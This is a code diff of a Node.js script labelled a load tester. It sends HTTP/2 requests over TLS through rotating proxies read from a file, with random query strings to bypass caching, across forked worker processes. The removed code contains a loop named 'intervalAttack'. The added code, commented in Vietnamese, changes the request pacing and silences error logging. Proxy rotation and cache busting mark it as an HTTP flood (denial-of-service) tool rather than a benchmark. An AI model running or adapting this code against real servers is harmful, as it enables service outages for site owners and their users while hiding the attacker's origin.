@@ -7,11 +7,6 @@ const fs = require('fs');
 process.setMaxListeners(0);
 require('events').EventEmitter.defaultMaxListeners = 0;
 
-// Handle uncaught exceptions gracefully
-process.on('uncaughtException', (err) => {
-    console.error('Uncaught Exception:', err.message);
-});
-
 if (process.argv.length < 6) {
     console.log('Usage: node load_test.js <target> <time> <rate> <threads> <proxyfile>');
     process.exit(1);
@@ -77,11 +72,7 @@ const headers = {
 const proxies = readLines(args.proxyFile);
 
 if (cluster.isMaster) {
-    console.clear();
-    console.log(`Load Testing Target: ${parsedTarget.host}`);
-    console.log(`Duration: ${args.time} seconds`);
-    console.log(`Threads: ${args.threads}`);
-    console.log(`RPS: ${args.rate}`);
+    console.log(`Starting load test on ${parsedTarget.host} for ${args.time}s with ${args.threads} threads, ${args.rate} RPS`);
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
@@ -90,15 +81,16 @@ if (cluster.isMaster) {
         process.exit(0);
     }, args.time * 1000);
 } else {
-    setInterval(runLoadTest, 10);
+    // Điều chỉnh interval để ổn định RPS
+    const intervalMs = 1000 / args.rate; // Chia đều request trong 1 giây
+    setInterval(runLoadTest, intervalMs);
 }
 
 function runLoadTest() {
     const proxyAddr = randomElement(proxies);
     const [proxyHost, proxyPort] = proxyAddr.split(':');
     if (!proxyHost || !proxyPort) {
-        console.error(`Invalid proxy format: ${proxyAddr}`);
-        return;
+        return; // Bỏ qua proxy không hợp lệ, không log
     }
 
     const tlsOptions = {
@@ -127,33 +119,28 @@ function runLoadTest() {
     });
 
     client.on('connect', () => {
-        const intervalAttack = setInterval(() => {
-            for (let i = 0; i < args.rate; i++) {
-                const request = client.request({
-                    ...headers,
-                    ':path': parsedTarget.path + '?' + randstr(10) + '=' + randstr(5)
-                });
-                request.on('response', () => {
-                    request.close();
-                    request.destroy();
-                });
-                request.on('error', () => {
-                    request.close();
-                    request.destroy();
-                });
-                request.end();
-            }
-        }, 20);
+        // Gửi đúng 1 request mỗi lần gọi để ổn định RPS
+        const request = client.request({
+            ...headers,
+            ':path': parsedTarget.path + '?' + randstr(10) + '=' + randstr(5)
+        });
+        request.on('response', () => {
+            request.close();
+            request.destroy();
+        });
+        request.on('error', () => {
+            request.close();
+            request.destroy();
+        });
+        request.end();
 
         setTimeout(() => {
-            clearInterval(intervalAttack);
             client.destroy();
             tlsConn.destroy();
         }, args.time * 1000);
     });
 
-    client.on('error', (err) => {
-        console.error(`Client error: ${err.message}`);
+    client.on('error', () => {
         client.destroy();
         tlsConn.destroy();
     });
